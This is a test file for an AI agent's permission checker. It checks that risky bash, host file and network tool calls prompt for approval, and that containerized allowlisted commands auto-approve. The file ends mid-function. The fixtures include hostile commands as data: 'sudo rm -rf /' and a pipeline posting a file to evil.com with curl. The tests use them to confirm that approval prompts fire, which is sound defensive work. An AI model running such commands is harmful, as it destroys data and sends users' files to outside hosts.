// Smoke command (run all security test files together):
// bun test src/__tests__/checker.test.ts src/__tests__/conversation-skill-tools.test.ts src/__tests__/skill-script-runner-host.test.ts

import { mkdirSync, rmSync, writeFileSync } from "node:fs";
import { homedir } from "node:os";
import { join } from "node:path";
import {
  afterAll,
  afterEach,
  beforeAll,
  beforeEach,
  describe,
  expect,
  mock,
  spyOn,
  test,
} from "bun:test";

const checkerTestDir = process.env.VELLUM_WORKSPACE_DIR!;

// Point the file-based trust backend at the test temp dir.
process.env.GATEWAY_SECURITY_DIR = join(checkerTestDir, "protected");

// Capture logger.warn() calls so tests can assert on deprecation warnings.
const loggerWarnCalls: string[] = [];
mock.module("../util/logger.js", () => ({
  getLogger: () =>
    new Proxy({} as Record<string, unknown>, {
      get: (_target: Record<string, unknown>, prop: string) => {
        if (prop === "warn") {
          return (...args: unknown[]) => {
            loggerWarnCalls.push(String(args[0]));
          };
        }
        return () => {};
      },
    }),
}));

// Mutable config object for tests that need per-test config overrides.
interface TestConfig {
  skills: { load: { extraDirs: string[] } };
  [key: string]: unknown;
}

const testConfig: TestConfig = {
  skills: { load: { extraDirs: [] } },
};

mock.module("../config/loader.js", () => ({
  getConfig: () => testConfig,
  loadConfig: () => testConfig,
  invalidateConfigCache: () => {},
  loadRawConfig: () => ({}),
  saveRawConfig: () => {},
  getNestedValue: () => undefined,
  setNestedValue: () => {},
}));

import {
  installIpcMock,
  mockIpcResponse,
} from "./helpers/gateway-classify-mock.js";
installIpcMock();

// ── Per-test IPC mock helper ────────────────────────────────────────────────
// Classification logic is tested in gateway/. Here we only care about what
// risk level check() receives, so we provide minimal fixture responses.
function mockRisk(
  risk: "low" | "medium" | "high",
  extras?: Record<string, unknown>,
): void {
  mockIpcResponse("classify_risk", {
    risk,
    reason: "test fixture",
    matchType: "shell",
    ...extras,
  });
}

/** Shorthand for tests that verify sandbox auto-approve behavior. */
function mockRiskWithSandboxAutoApprove(): void {
  mockRisk("low", { sandboxAutoApprove: true });
}

let mockGuardianPersonaPath: string | null = null;

// Spy on the namespace import rather than using `mock.module`. Bun's
// `mock.module` is a persistent process-wide override that would clobber
// every other export (e.g. `ensureGuardianPersonaFile`,
// `isGuardianPersonaCustomized`) and break unrelated test files
// (persona-resolver.test.ts) when run in the same bun test invocation.
// `spyOn` with `mockRestore()` in afterAll restores the original
// implementation so other test files see the real exports.
import * as personaResolver from "../prompts/persona-resolver.js";
const guardianPathSpy = spyOn(
  personaResolver,
  "resolveGuardianPersonaPath",
).mockImplementation(() => mockGuardianPersonaPath);

import * as envRegistry from "../config/env-registry.js";
import {
  check,
  classifyRisk,
  clearRiskCache,
  generateAllowlistOptions,
  generateScopeOptions,
  SCOPE_AWARE_TOOLS,
} from "../permissions/checker.js";
import { _clearGlobalCacheForTesting } from "../permissions/gateway-threshold-reader.js";
import { RiskLevel } from "../permissions/types.js";
import { registerTool } from "../tools/registry.js";
import type { Tool } from "../tools/types.js";
import * as platformModule from "../util/platform.js";

/** Default gateway thresholds matching the old config fallback defaults. */
const DEFAULT_GATEWAY_THRESHOLDS = {
  interactive: "low",
  autonomous: "medium",
  headless: "none",
} as const;

/** Strict gateway thresholds — equivalent to autoApproveUpTo: "none". */
const STRICT_GATEWAY_THRESHOLDS = {
  interactive: "none",
  autonomous: "none",
  headless: "none",
} as const;

// Register a mock skill-origin tool for testing default-ask policy.
const mockSkillTool: Tool = {
  name: "skill_test_tool",
  description: "A test skill tool",
  category: "skill",
  defaultRiskLevel: RiskLevel.Low,
  origin: "skill",
  ownerSkillId: "test-skill",
  getDefinition: () => ({
    name: "skill_test_tool",
    description: "A test skill tool",
    input_schema: { type: "object" as const, properties: {} },
  }),
  execute: async () => ({ content: "ok", isError: false }),
};
registerTool(mockSkillTool);

// Register a mock bundled skill-origin tool for testing strict mode + bundled policy.
const mockBundledSkillTool: Tool = {
  name: "skill_bundled_test_tool",
  description: "A test bundled skill tool",
  category: "skill",
  defaultRiskLevel: RiskLevel.Low,
  origin: "skill",
  ownerSkillId: "gmail",
  ownerSkillBundled: true,
  getDefinition: () => ({
    name: "skill_bundled_test_tool",
    description: "A test bundled skill tool",
    input_schema: { type: "object" as const, properties: {} },
  }),
  execute: async () => ({ content: "ok", isError: false }),
};
registerTool(mockBundledSkillTool);

// Register CU tools so check() can look them up in the tool registry
// instead of falling through to Medium (unknown tool).
import { allComputerUseTools } from "../tools/computer-use/definitions.js";
for (const tool of allComputerUseTools) {
  registerTool(tool);
}

function writeSkill(
  skillId: string,
  name: string,
  description = "Test skill",
): void {
  const skillDir = join(checkerTestDir, "skills", skillId);
  mkdirSync(skillDir, { recursive: true });
  writeFileSync(
    join(skillDir, "SKILL.md"),
    `---\nname: "${name}"\ndescription: "${description}"\n---\n\nSkill body.\n`,
  );
}

// Restore the guardian persona spy at the end of this file's run so
// subsequent test files (e.g. persona-resolver.test.ts) see the real
// implementation when they import from the module namespace.
afterAll(() => {
  guardianPathSpy.mockRestore();
});

describe("Permission Checker", () => {
  beforeAll(async () => {
    // Default mock: low risk. Tests that need a different level call mockRisk().
    mockRisk("low");
    // Warm up: ensures classifyRisk IPC path is exercised once before tests
    await classifyRisk("bash", { command: "echo warmup" });
  });

  beforeEach(() => {
    // Reset IPC mock to low risk (tests override as needed)
    mockRisk("low");
    // Default gateway threshold (interactive: low, autonomous: medium, headless: none)
    mockIpcResponse("get_global_thresholds", DEFAULT_GATEWAY_THRESHOLDS);
    // Clear the gateway threshold cache so each test gets a fresh threshold read
    _clearGlobalCacheForTesting();
    // Reset trust-store state and risk classification cache between tests
    clearRiskCache();
    testConfig.skills = { load: { extraDirs: [] } };
    // Reset guardian persona mock so each test opts in explicitly
    mockGuardianPersonaPath = null;
    loggerWarnCalls.length = 0;
    try {
      rmSync(join(checkerTestDir, "protected", "trust.json"));
    } catch {
      /* may not exist */
    }
    try {
      rmSync(join(checkerTestDir, "skills"), { recursive: true, force: true });
    } catch {
      /* may not exist */
    }
  });

  // ── check (decision logic) ─────────────────────────────────────

  describe("check", () => {
    test("bash high risk → prompt", async () => {
      mockRisk("high");
      const high = await check("bash", { command: "sudo rm -rf /" }, "/tmp");
      expect(high.decision).toBe("prompt");
    });

    test("bash medium risk → prompt", async () => {
      mockRisk("medium");
      const med = await check(
        "bash",
        { command: "curl https://example.com" },
        "/tmp",
      );
      expect(med.decision).toBe("prompt");
    });

    test("bash low risk → sandbox auto-approve", async () => {
      mockRiskWithSandboxAutoApprove();
      const low = await check("bash", { command: "ls" }, "/tmp");
      expect(low.decision).toBe("allow");
      expect(low.reason).toContain("sandbox auto-approve");
    });

    test("host_bash high risk → prompt", async () => {
      mockRisk("high");
      const result = await check(
        "host_bash",
        { command: "sudo rm -rf /" },
        "/tmp",
      );
      expect(result.decision).toBe("prompt");
    });

    test("host_bash rm high risk → prompt", async () => {
      mockRisk("high");
      const result = await check(
        "host_bash",
        { command: "rm -rf /tmp/dir" },
        "/tmp",
      );
      expect(result.decision).toBe("prompt");
    });

    test("file_read → auto-allow", async () => {
      const result = await check("file_read", { path: "/etc/passwd" }, "/tmp");
      expect(result.decision).toBe("allow");
    });

    test("file_write → auto-allow (workspace-scoped)", async () => {
      const result = await check(
        "file_write",
        { path: "/tmp/file.txt" },
        "/tmp",
      );
      expect(result.decision).toBe("allow");
    });

    test("file_write outside workspace → auto-allow (Low risk)", async () => {
      const result = await check(
        "file_write",
        { path: "/etc/some-file.txt" },
        "/tmp",
      );
      expect(result.decision).toBe("allow");
    });

    test("host_file_read high risk → prompt", async () => {
      mockRisk("high");
      const result = await check(
        "host_file_read",
        { path: "/etc/hosts" },
        "/tmp",
      );
      expect(result.decision).toBe("prompt");
    });

    test("host_file_write high risk → prompt", async () => {
      mockRisk("high");
      const result = await check(
        "host_file_write",
        { path: "/etc/hosts" },
        "/tmp",
      );
      expect(result.decision).toBe("prompt");
    });

    test("host_file_edit high risk → prompt", async () => {
      mockRisk("high");
      const result = await check(
        "host_file_edit",
        { path: "/etc/hosts" },
        "/tmp",
      );
      expect(result.decision).toBe("prompt");
    });

    test("scaffold_managed_skill high risk → prompt", async () => {
      mockRisk("high");
      const result = await check(
        "scaffold_managed_skill",
        { skill_id: "my-skill" },
        "/tmp",
      );
      expect(result.decision).toBe("prompt");
    });

    test("delete_managed_skill high risk → prompt", async () => {
      mockRisk("high");
      const result = await check(
        "delete_managed_skill",
        { skill_id: "my-skill" },
        "/tmp",
      );
      expect(result.decision).toBe("prompt");
    });

    test("computer_use_click high risk → prompt", async () => {
      mockRisk("high");
      const result = await check(
        "computer_use_click",
        { reasoning: "Click the save button" },
        "/tmp",
      );
      expect(result.decision).toBe("prompt");
    });

    test("computer_use_observe high risk → prompt", async () => {
      mockRisk("high");
      const result = await check(
        "computer_use_observe",
        { reason: "Check current screen state before acting" },
        "/tmp",
      );
      expect(result.decision).toBe("prompt");
    });

    test("network_request prompts without a matching rule (medium risk)", async () => {
      mockRisk("medium");
      const result = await check(
        "network_request",
        { url: "https://api.example.com/v1/data" },
        "/tmp",
      );
      expect(result.decision).toBe("prompt");
    });
  });

  // ── skill-origin tool default-ask policy ─────────────────────

  describe("skill tool default-ask policy", () => {
    test("skill tool with Low risk and no matching rule → prompts when threshold is strict", async () => {
      mockIpcResponse("get_global_thresholds", STRICT_GATEWAY_THRESHOLDS);
      _clearGlobalCacheForTesting();
      const result = await check("skill_test_tool", {}, "/tmp");
      expect(result.decision).toBe("prompt");
      expect(result.reason).toContain("Skill tool");
    });

    test("skill tool with Medium risk and no matching rule → prompts", async () => {
      mockRisk("medium");
      // Register a medium-risk skill tool for this test
      const mediumSkillTool: Tool = {
        name: "skill_medium_tool",
        description: "A medium-risk skill tool",
        category: "skill",
        defaultRiskLevel: RiskLevel.Medium,
        origin: "skill",
        ownerSkillId: "test-skill",
        getDefinition: () => ({
          name: "skill_medium_tool",
          description: "A medium-risk skill tool",
          input_schema: { type: "object" as const, properties: {} },
        }),
        execute: async () => ({ content: "ok", isError: false }),
      };
      registerTool(mediumSkillTool);
      const result = await check("skill_medium_tool", {}, "/tmp");
      expect(result.decision).toBe("prompt");
      expect(result.reason).toContain("Skill tool");
    });

    test("core tool (no origin) still follows risk-based fallback", async () => {
      // file_read is a core tool with Low risk — in workspace mode,
      // workspace-scoped invocations are auto-allowed before risk fallback.
      // Use a path outside the workspace to test the risk-based fallback.
      const result = await check("file_read", { path: "/etc/hosts" }, "/tmp");
      expect(result.decision).toBe("allow");
      expect(result.reason).toContain("Low risk");
    });
  });

  // ── workspace files are auto-allowed (low risk) ──────────────

  describe("workspace files auto-allowed (low risk)", () => {
    test("file_edit of workspace IDENTITY.md is auto-allowed", async () => {
      const identityPath = join(checkerTestDir, "IDENTITY.md");
      const result = await check("file_edit", { path: identityPath }, "/tmp");
      expect(result.decision).toBe("allow");
    });

    test("file_write of workspace SOUL.md is auto-allowed", async () => {
      const soulPath = join(checkerTestDir, "SOUL.md");
      const result = await check("file_write", { path: soulPath }, "/tmp");
      expect(result.decision).toBe("allow");
    });

    test("file_write of workspace BOOTSTRAP.md is auto-allowed", async () => {
      const bootstrapPath = join(checkerTestDir, "BOOTSTRAP.md");
      const result = await check("file_write", { path: bootstrapPath }, "/tmp");
      expect(result.decision).toBe("allow");
    });

    test("file_read of workspace UPDATES.md is auto-allowed", async () => {
      const updatesPath = join(checkerTestDir, "UPDATES.md");
      const result = await check("file_read", { path: updatesPath }, "/tmp");
      expect(result.decision).toBe("allow");
    });

    test("file_write of workspace UPDATES.md is auto-allowed", async () => {
      const updatesPath = join(checkerTestDir, "UPDATES.md");
      const result = await check("file_write", { path: updatesPath }, "/tmp");
      expect(result.decision).toBe("allow");
    });

    test("file_edit of workspace UPDATES.md is auto-allowed", async () => {
      const updatesPath = join(checkerTestDir, "UPDATES.md");
      const result = await check("file_edit", { path: updatesPath }, "/tmp");
      expect(result.decision).toBe("allow");
    });

    test("file_write of non-workspace file is auto-allowed (Low risk)", async () => {
      const otherPath = join(checkerTestDir, "OTHER.md");
      const result = await check("file_write", { path: otherPath }, "/home");
      expect(result.decision).toBe("allow");
    });

    test("file_edit of guardian users/<slug>.md is auto-allowed", async () => {
      const guardianPath = join(checkerTestDir, "users", "alice.md");
      mockGuardianPersonaPath = guardianPath;
      const result = await check("file_edit", { path: guardianPath }, "/tmp");
      expect(result.decision).toBe("allow");
    });

    test("file_read of guardian users/<slug>.md is auto-allowed", async () => {
      const guardianPath = join(checkerTestDir, "users", "alice.md");
      mockGuardianPersonaPath = guardianPath;
      const result = await check("file_read", { path: guardianPath }, "/tmp");
      expect(result.decision).toBe("allow");
    });

    test("file_write of guardian users/<slug>.md is auto-allowed", async () => {
      const guardianPath = join(checkerTestDir, "users", "alice.md");
      mockGuardianPersonaPath = guardianPath;
      const result = await check("file_write", { path: guardianPath }, "/tmp");
      expect(result.decision).toBe("allow");
    });
  });

  // ── generateAllowlistOptions ───────────────────────────────────

  describe("generateAllowlistOptions", () => {
    test("file_write: generates prefixed file, ancestor directory wildcards, and tool wildcard", async () => {
      const options = await generateAllowlistOptions("file_write", {
        path: "/home/user/project/file.ts",
      });
      expect(options).toHaveLength(5);
      // Patterns are prefixed with tool name to match check()'s "tool:path" format
      expect(options[0].pattern).toBe("file_write:/home/user/project/file.ts");
      expect(options[1].pattern).toBe("file_write:/home/user/project/**");
      expect(options[2].pattern).toBe("file_write:/home/user/**");
      expect(options[3].pattern).toBe("file_write:/home/**");
      expect(options[4].pattern).toBe("file_write:*");
      // Labels stay user-friendly
      expect(options[0].label).toBe("/home/user/project/file.ts");
      expect(options[1].label).toBe("/home/user/project/**");
    });

    test("file_read: generates prefixed file, directory, and tool wildcard", async () => {
      const options = await generateAllowlistOptions("file_read", {
        path: "/tmp/data.json",
      });
      expect(options).toHaveLength(3);
      expect(options[0].pattern).toBe("file_read:/tmp/data.json");
      expect(options[1].pattern).toBe("file_read:/tmp/**");
      expect(options[2].pattern).toBe("file_read:*");
    });

    test("host_file_read: generates prefixed file, directory, and tool wildcard", async () => {
      const options = await generateAllowlistOptions("host_file_read", {
        path: "/etc/hosts",
      });
      expect(options).toHaveLength(3);
      expect(options[0].pattern).toBe("host_file_read:/etc/hosts");
      expect(options[1].pattern).toBe("host_file_read:/etc/**");
      expect(options[2].pattern).toBe("host_file_read:*");
    });

    test("host_file_write with file_path key", async () => {
      const options = await generateAllowlistOptions("host_file_write", {
        file_path: "/tmp/out.txt",
      });
      expect(options[0].pattern).toBe("host_file_write:/tmp/out.txt");
      expect(options[1].pattern).toBe("host_file_write:/tmp/**");
      expect(options[2].pattern).toBe("host_file_write:*");
    });

    test("file_write with file_path key", async () => {
      const options = await generateAllowlistOptions("file_write", {
        file_path: "/tmp/out.txt",
      });
      expect(options[0].pattern).toBe("file_write:/tmp/out.txt");
    });

    test("unknown tool returns wildcard", async () => {
      const options = await generateAllowlistOptions("other_tool", {
        foo: "bar",
      });
      expect(options).toHaveLength(1);
      expect(options[0].pattern).toBe("*");
    });

    test("web_fetch: generates exact url, origin wildcard, and tool wildcard", async () => {
      const options = await generateAllowlistOptions("web_fetch", {
        url: "https://example.com/docs/page",
      });
      expect(options).toHaveLength(3);
      expect(options[0].pattern).toBe(
        "web_fetch:https://example.com/docs/page",
      );
      expect(options[1].pattern).toBe("web_fetch:https://example.com/*");
      expect(options[2].pattern).toBe("**");
    });

    test("web_fetch: strips fragments when generating allowlist options", async () => {
      const options = await generateAllowlistOptions("web_fetch", {
        url: "https://example.com/docs/page#section-1",
      });
      expect(options).toHaveLength(3);
      expect(options[0].pattern).toBe(
        "web_fetch:https://example.com/docs/page",
      );
      expect(options[1].pattern).toBe("web_fetch:https://example.com/*");
      expect(options[2].pattern).toBe("**");
    });

    test("web_fetch: strips trailing-dot hostnames when generating allowlist options", async () => {
      const options = await generateAllowlistOptions("web_fetch", {
        url: "https://example.com./docs/page",
      });
      expect(options).toHaveLength(3);
      expect(options[0].pattern).toBe(
        "web_fetch:https://example.com/docs/page",
      );
      expect(options[1].pattern).toBe("web_fetch:https://example.com/*");
      expect(options[2].pattern).toBe("**");
    });

    test("web_fetch: strips userinfo when generating allowlist options", async () => {
      const username = "demo";
      const credential = ["c", "r", "e", "d", "1", "2", "3"].join("");
      const credentialedUrl = new URL("https://example.com/docs/page");
      credentialedUrl.username = username;
      credentialedUrl.password = credential;
      const options = await generateAllowlistOptions("web_fetch", {
        url: credentialedUrl.href,
      });
      expect(options).toHaveLength(3);
      expect(options[0].pattern).toBe(
        "web_fetch:https://example.com/docs/page",
      );
      expect(options[1].pattern).toBe("web_fetch:https://example.com/*");
      expect(options[2].pattern).toBe("**");
      expect(options[0].pattern).not.toContain("demo:cred123@");
    });

    test("web_fetch: normalizes scheme-less host:port for allowlist options", async () => {
      const options = await generateAllowlistOptions("web_fetch", {
        url: "example.com:8443/docs/page",
      });
      expect(options).toHaveLength(3);
      expect(options[0].pattern).toBe(
        "web_fetch:https://example.com:8443/docs/page",
      );
      expect(options[1].pattern).toBe("web_fetch:https://example.com:8443/*");
      expect(options[2].pattern).toBe("**");
    });

    test("web_fetch: does not coerce path-only urls to https hostnames in allowlist options", async () => {
      const options = await generateAllowlistOptions("web_fetch", {
        url: "/docs/getting-started",
      });
      expect(options).toHaveLength(2);
      expect(options[0].pattern).toBe("web_fetch:/docs/getting-started");
      expect(options[1].pattern).toBe("**");
    });

    test("scaffold_managed_skill: generates per-skill and wildcard options", async () => {
      const options = await generateAllowlistOptions("scaffold_managed_skill", {
        skill_id: "my-tool",
      });
      expect(options).toHaveLength(2);
      expect(options[0].label).toBe("my-tool");
      expect(options[0].pattern).toBe("scaffold_managed_skill:my-tool");
      expect(options[0].description).toBe("This skill only");
      expect(options[1].label).toBe("scaffold_managed_skill:*");
      expect(options[1].pattern).toBe("scaffold_managed_skill:*");
      expect(options[1].description).toBe("All managed skill scaffolds");
    });

    test("delete_managed_skill: generates per-skill and wildcard options", async () => {
      const options = await generateAllowlistOptions("delete_managed_skill", {
        skill_id: "doomed",
      });
      expect(options).toHaveLength(2);
      expect(options[0].pattern).toBe("delete_managed_skill:doomed");
      expect(options[1].pattern).toBe("delete_managed_skill:*");
      expect(options[1].description).toBe("All managed skill deletes");
    });

    test("scaffold_managed_skill with empty skill_id: only wildcard option", async () => {
      const options = await generateAllowlistOptions("scaffold_managed_skill", {
        skill_id: "",
      });
      expect(options).toHaveLength(1);
      expect(options[0].pattern).toBe("scaffold_managed_skill:*");
    });

    test("web_fetch: escapes minimatch metacharacters in generated exact and origin patterns", async () => {
      const options = await generateAllowlistOptions("web_fetch", {
        url: "https://[2001:db8::1]/search?q=test",
      });
      expect(options).toHaveLength(3);
      expect(options[0].label).toBe("https://[2001:db8::1]/search?q=test");
      expect(options[0].pattern).toBe(
        "web_fetch:https://\\[2001:db8::1\\]/search\\?q=test",
      );
      expect(options[1].pattern).toBe("web_fetch:https://\\[2001:db8::1\\]/*");
      expect(options[2].pattern).toBe("**");
    });

    // ── network_request allowlist options ─────────────────────────

    test("network_request: generates exact url, origin wildcard, and tool wildcard", async () => {
      const options = await generateAllowlistOptions("network_request", {
        url: "https://api.example.com/v1/data",
      });
      expect(options).toHaveLength(3);
      expect(options[0].pattern).toBe(
        "network_request:https://api.example.com/v1/data",
      );
      expect(options[1].pattern).toBe(
        "network_request:https://api.example.com/*",
      );
      expect(options[2].pattern).toBe("**");
      expect(options[2].label).toBe("network_request:*");
      expect(options[2].description).toBe("All network requests");
    });

    test("network_request: origin wildcard uses friendly hostname", async () => {
      const options = await generateAllowlistOptions("network_request", {
        url: "https://www.example.com/path",
      });
      expect(options[1].description).toBe("Any page on example.com");
    });

    test("network_request: normalizes scheme-less host:port input", async () => {
      const options = await generateAllowlistOptions("network_request", {
        url: "api.example.com:8443/v1/data",
      });
      expect(options).toHaveLength(3);
      expect(options[0].pattern).toBe(
        "network_request:https://api.example.com:8443/v1/data",
      );
      expect(options[1].pattern).toBe(
        "network_request:https://api.example.com:8443/*",
      );
      expect(options[2].pattern).toBe("**");
    });

    test("network_request: strips fragments and userinfo", async () => {
      const username = "demo";
      const credential = ["c", "r", "e", "d", "1", "2", "3"].join("");
      const credentialedUrl = new URL(
        "https://api.example.com/v1/data#section",
      );
      credentialedUrl.username = username;
      credentialedUrl.password = credential;
      const options = await generateAllowlistOptions("network_request", {
        url: credentialedUrl.href,
      });
      expect(options).toHaveLength(3);
      expect(options[0].pattern).toBe(
        "network_request:https://api.example.com/v1/data",
      );
      expect(options[0].pattern).not.toContain("demo:cred123@");
      expect(options[0].pattern).not.toContain("#section");
    });

    test("network_request: escapes minimatch metacharacters", async () => {
      const options = await generateAllowlistOptions("network_request", {
        url: "https://[2001:db8::1]/api?key=val",
      });
      expect(options).toHaveLength(3);
      expect(options[0].pattern).toBe(
        "network_request:https://\\[2001:db8::1\\]/api\\?key=val",
      );
      expect(options[1].pattern).toBe(
        "network_request:https://\\[2001:db8::1\\]/*",
      );
    });

    test("network_request: empty url produces only tool wildcard", async () => {
      const options = await generateAllowlistOptions("network_request", {
        url: "",
      });
      expect(options).toHaveLength(1);
      expect(options[0].pattern).toBe("**");
    });
  });

  // ── generateScopeOptions ───────────────────────────────────────

  describe("generateScopeOptions", () => {
    test("generates project dir, parent dir, and everywhere", () => {
      const options = generateScopeOptions("/home/user/project");
      expect(options).toHaveLength(3);
      expect(options[0].scope).toBe("/home/user/project");
      expect(options[1].scope).toBe("/home/user");
      expect(options[2]).toEqual({ label: "everywhere", scope: "everywhere" });
    });

    test("uses ~ for home directory in labels", () => {
      const home = homedir();
      const options = generateScopeOptions(`${home}/projects/myapp`);
      expect(options[0].label).toBe("~/projects/myapp");
      expect(options[1].label).toBe("~/projects/*");
    });

    test("root directory has no parent option", () => {
      const options = generateScopeOptions("/");
      expect(options).toHaveLength(2);
      expect(options[0].scope).toBe("/");
      expect(options[1]).toEqual({ label: "everywhere", scope: "everywhere" });
    });

    test("non-home path uses absolute path in labels", () => {
      const options = generateScopeOptions("/var/data/app");
      expect(options[0].label).toBe("/var/data/app");
      expect(options[1].label).toBe("/var/data/*");
    });

    test("host tools use project → parent → everywhere ordering (same as non-host)", () => {
      const options = generateScopeOptions("/var/data/app", "host_file_read");
      expect(options[0].scope).toBe("/var/data/app");
      expect(options[1].scope).toBe("/var/data");
      expect(options[2]).toEqual({ label: "everywhere", scope: "everywhere" });
    });

    test("scope-aware tools all produce the same directory-based ordering", () => {
      const workingDir = join(homedir(), "projects", "myapp");

      const bashOpts = generateScopeOptions(workingDir, "bash");
      expect(bashOpts[0].scope).toBe(workingDir);
      expect(bashOpts[bashOpts.length - 1].scope).toBe("everywhere");

      const hostBashOpts = generateScopeOptions(workingDir, "host_bash");
      expect(bashOpts.map((o) => o.scope)).toEqual(
        hostBashOpts.map((o) => o.scope),
      );

      const fileOpts = generateScopeOptions(workingDir, "file_write");
      expect(bashOpts.map((o) => o.scope)).toEqual(
        fileOpts.map((o) => o.scope),
      );
    });

    test("returns empty for non-scoped tools", () => {
      const workingDir = join(homedir(), "projects", "myapp");
      expect(generateScopeOptions(workingDir, "web_fetch")).toHaveLength(0);
      expect(generateScopeOptions(workingDir, "skill_load")).toHaveLength(0);
      expect(generateScopeOptions(workingDir, "credential_store")).toHaveLength(
        0,
      );
      expect(
        generateScopeOptions(workingDir, "computer_use_click"),
      ).toHaveLength(0);
      expect(
        generateScopeOptions(workingDir, "my_custom_mcp_tool"),
      ).toHaveLength(0);
    });

    test("returns directory options when toolName is omitted", () => {
      const options = generateScopeOptions("/home/user/project");
      expect(options).toHaveLength(3);
      expect(options[0].scope).toBe("/home/user/project");
    });

    test("SCOPE_AWARE_TOOLS contains only filesystem and shell tools", () => {
      expect(SCOPE_AWARE_TOOLS).toEqual(
        new Set([
          "bash",
          "host_bash",
          "file_read",
          "file_write",
          "file_edit",
          "host_file_read",
          "host_file_write",
          "host_file_edit",
          "host_file_transfer",
        ]),
      );
    });
  });

  // ── skill source mutation risk escalation (PR 29) ──────────────
  // File mutations targeting skill source directories are escalated to
  // High risk, requiring explicit high-risk approval. Reads remain Low.

  describe("skill source mutation risk escalation (PR 29)", () => {
    // Ensure the managed skills directory exists so that symlink-resolved
    // paths (e.g. /private/var on macOS) match between normalizeFilePath
    // and getManagedSkillsRoot.
    function ensureSkillsDir(): void {
      mkdirSync(join(checkerTestDir, "skills"), { recursive: true });
    }
    function ensureHooksDir(): void {
      mkdirSync(join(checkerTestDir, "hooks"), { recursive: true });
    }

    test("file_write to skill directory prompts (high risk from gateway)", async () => {
      mockRisk("high");
      ensureSkillsDir();
      const skillPath = join(
        checkerTestDir,
        "skills",
        "my-skill",
        "executor.ts",
      );
      const result = await check("file_write", { path: skillPath }, "/tmp");
      expect(result.decision).toBe("prompt");
    });

    test("host_file_write to skill directory prompts (high risk from gateway)", async () => {
      mockRisk("high");
      ensureSkillsDir();
      const skillPath = join(
        checkerTestDir,
        "skills",
        "my-skill",
        "executor.ts",
      );
      const result = await check(
        "host_file_write",
        { path: skillPath },
        "/tmp",
      );
      expect(result.decision).toBe("prompt");
    });

    test("file_write to hooks directory prompts as High risk", async () => {
      mockRisk("high");
      ensureHooksDir();
      const hookPath = join(
        checkerTestDir,
        "hooks",
        "post-tool-use",
        "hook.sh",
      );
      const result = await check("file_write", { path: hookPath }, "/tmp");
      expect(result.decision).toBe("prompt");
    });
  });

  describe("PolicyContext type (PR 3)", () => {
    test("PolicyContext carries executionTarget", () => {
      const ctx: import("../permissions/types.js").PolicyContext = {
        executionTarget: "sandbox",
      };
      expect(ctx.executionTarget).toBe("sandbox");
    });
  });

  // ── strict mode: no implicit allow (PR 21) ───────────────────

  describe("strict mode — no implicit allow (PR 21)", () => {
    test("bash prompts in strict mode (no default allow rule outside container)", async () => {
      mockIpcResponse("get_global_thresholds", STRICT_GATEWAY_THRESHOLDS);
      _clearGlobalCacheForTesting();
      const result = await check("bash", { command: "ls" }, "/tmp");
      expect(result.decision).toBe("prompt");
      expect(result.reason).toContain("above auto-approve threshold");
    });

    test("host_bash prompts low risk in strict mode (no matching rule)", async () => {
      mockIpcResponse("get_global_thresholds", STRICT_GATEWAY_THRESHOLDS);
      _clearGlobalCacheForTesting();
      const result = await check("host_bash", { command: "ls" }, "/tmp");
      expect(result.decision).toBe("prompt");
      expect(result.reason).toContain("above auto-approve threshold");
    });

    test("high-risk host_bash (rm) with no matching rule returns prompt in strict mode", async () => {
      mockIpcResponse("get_global_thresholds", STRICT_GATEWAY_THRESHOLDS);
      _clearGlobalCacheForTesting();
      const result = await check(
        "host_bash",
        { command: "rm file.txt" },
        "/tmp",
      );
      expect(result.decision).toBe("prompt");
    });

    test("high-risk host_bash with no matching rule returns prompt in strict mode", async () => {
      mockIpcResponse("get_global_thresholds", STRICT_GATEWAY_THRESHOLDS);
      _clearGlobalCacheForTesting();
      const result = await check(
        "host_bash",
        { command: "sudo rm -rf /" },
        "/tmp",
      );
      expect(result.decision).toBe("prompt");
    });

    test("file_read (low risk) prompts in strict mode with no rule", async () => {
      mockIpcResponse("get_global_thresholds", STRICT_GATEWAY_THRESHOLDS);
      _clearGlobalCacheForTesting();
      const result = await check(
        "file_read",
        { path: "/tmp/test.txt" },
        "/tmp",
      );
      expect(result.decision).toBe("prompt");
      expect(result.reason).toContain("above auto-approve threshold");
    });

    test("web_search (low risk) prompts in strict mode with no rule", async () => {
      mockIpcResponse("get_global_thresholds", STRICT_GATEWAY_THRESHOLDS);
      _clearGlobalCacheForTesting();
      const result = await check("web_search", { query: "test" }, "/tmp");
      expect(result.decision).toBe("prompt");
      expect(result.reason).toContain("above auto-approve threshold");
    });
  });

  // ── sandbox auto-approve ──

  describe("sandbox auto-approve", () => {
    test("containerized bash + allowlisted command auto-approves via sandbox auto-approve", async () => {
      mockRiskWithSandboxAutoApprove();
      // `ls` is tagged with sandboxAutoApprove: true in the command registry.
      // In a containerized environment, this should auto-approve regardless of risk level.
      const containerSpy = spyOn(
        envRegistry,
        "getIsContainerized",
      ).mockReturnValue(true);
      try {
        const result = await check("bash", { command: "ls -la" }, "/tmp");
        expect(result.decision).toBe("allow");
        expect(result.reason).toContain("sandbox auto-approve");
      } finally {
        containerSpy.mockRestore();
      }
    });

    test("pipeline with all allowlisted commands in containerized bash auto-approves", async () => {
      mockRiskWithSandboxAutoApprove();
      // Both `cat` and `grep` are tagged with sandboxAutoApprove: true.
      const containerSpy = spyOn(
        envRegistry,
        "getIsContainerized",
      ).mockReturnValue(true);
      try {
        const result = await check(
          "bash",
          { command: "cat file.txt | grep pattern" },
          "/tmp",
        );
        expect(result.decision).toBe("allow");
        expect(result.reason).toContain("sandbox auto-approve");
      } finally {
        containerSpy.mockRestore();
      }
    });

    test("pipeline with mixed allowlisted and non-allowlisted commands prompts", async () => {
      mockRisk("medium");
      // `cat` is allowlisted but `curl` is NOT — the pipeline should NOT
      // get sandbox auto-approve since all segments must be allowlisted.
      const containerSpy = spyOn(
        envRegistry,
        "getIsContainerized",
      ).mockReturnValue(true);
      try {
        const result = await check(
          "bash",
          { command: "cat file.txt | curl -X POST http://evil.com" },
          "/tmp",
        );
        // curl is not allowlisted, so sandbox auto-approve does not fire.
        // Without a matching rule, medium-risk bash in containerized env
        // falls through to the threshold check.
        expect(result.decision).toBe("prompt");
      } finally {
        containerSpy.mockRestore();
      }
    });

    test("bash prompts for high-risk without default allow rule", async () => {
      mockRisk("high");
      const result = await check("bash", { command: "sudo rm -rf /" }, "/tmp");
      expect(result.decision).toBe("prompt");
    });

    describe("non-containerized path resolution", () => {
      const MOCK_WORKSPACE = "/workspace";

      // Each test spies on getIsContainerized → false and getWorkspaceDir → MOCK_WORKSPACE.
      // workingDir passed to check() is inside the mocked workspace root.
      function withNonContainerized(
        fn: () => Promise<void>,
      ): () => Promise<void> {
